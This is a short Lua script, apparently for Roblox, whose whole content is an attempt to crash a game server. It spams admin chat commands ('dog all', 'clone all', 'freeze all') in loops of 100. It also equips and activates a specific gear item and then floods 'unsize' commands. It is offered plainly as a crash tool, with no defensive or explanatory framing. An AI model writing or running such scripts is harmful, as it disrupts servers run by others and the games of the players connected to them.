print("trying dog crash...")
for i = 1,100 do
    game.Players:Chat("dog all all all")
    game.Players:Chat("clone all all all")
end

print("trying freeze crash...")
for i = 1,100 do
    game.Players:Chat("freeze all all all")
    game.Players:Chat("clone all all all")
end

print("trying vg crash...")
game.Players:Chat("gear me 94794847")
local Backpack = game.Players.LocalPlayer:FindFirstChildOfClass("Backpack")
game.Players.LocalPlayer.Backpack:WaitForChild("VampireVanquisher")
for _, v in ipairs(Backpack:GetChildren()) do
    v.Parent = game.Players.LocalPlayer.Character
    v:Activate()
end
wait(.15)
for i = 1,100 do
    game.Players:Chat("unsize me me me")
end

print("sorry, the server could not be crashed.")
